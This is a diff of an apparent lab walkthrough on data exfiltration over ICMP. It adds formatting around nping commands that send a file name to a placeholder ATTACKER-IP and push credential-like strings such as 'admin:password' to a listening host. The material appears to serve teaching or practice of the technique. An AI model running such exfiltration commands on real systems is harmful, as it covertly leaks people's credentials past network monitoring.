@@ -148,6 +148,7 @@ nping --icmp -c 1 ATTACKER-IP --data-string "BOFfile.txt"
 <p align="center">
   <img width="800" height="150" src="./img/12.jpg">
 </p>
+
 * The attacking host receiving the signal.
 <p align="center">
   <img width="800" height="100" src="./img/13.jpg">
@@ -156,6 +157,8 @@ nping --icmp -c 1 ATTACKER-IP --data-string "BOFfile.txt"
 Let's start our data exfiltration via ICMP. In the victim, we send some data;
 
 ```
+Victim sent data
+#################
 nping --icmp -c 1 10.10.61.247 --data-string "admin:password"
 nping --icmp -c 1 10.10.61.247 --data-string "jorge@gmail.com:asdaf@#"
 nping --icmp -c 1 10.10.61.247 --data-string "jorge:xxssdaf@#"
